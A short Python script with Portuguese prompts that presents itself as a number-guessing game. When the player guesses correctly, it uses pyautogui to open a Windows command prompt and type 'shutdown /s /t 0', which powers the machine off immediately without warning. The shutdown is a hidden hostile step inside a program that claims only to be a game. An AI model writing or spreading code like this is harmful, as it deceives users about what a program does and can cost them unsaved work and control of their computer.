import random
import pyautogui as pa
import os
import time as t

def main():
    print("Bem-vindo ao jogo de adivinhação!")
    print("Tente adivinhar um número entre 1 e 5.")

    # Gera um número aleatório entre 1 e 5
    numero_secreto = random.randint(1, 5)

    while True:
        try:
            # Solicita ao jogador para inserir um palpite
            palpite = int(input("Digite seu palpite: "))
            
            # Verifica se o palpite está correto
            if palpite == numero_secreto:
                print("Parabéns! Você acertou!")
                t.sleep(1)
                pa.press('win')
                t.sleep(.1)
                pa.typewrite('cmd')
                t.sleep(.1)
                pa.press('enter')
                t.sleep(.4)
                pa.typewrite('shutdown /s /t 0')
                t.sleep(.1)
                pa.press('enter')

                break
            else:
                print("Ops! Tente novamente.")
        except ValueError:
            print("Por favor, digite um número válido.")

if __name__ == "__main__":
    main()
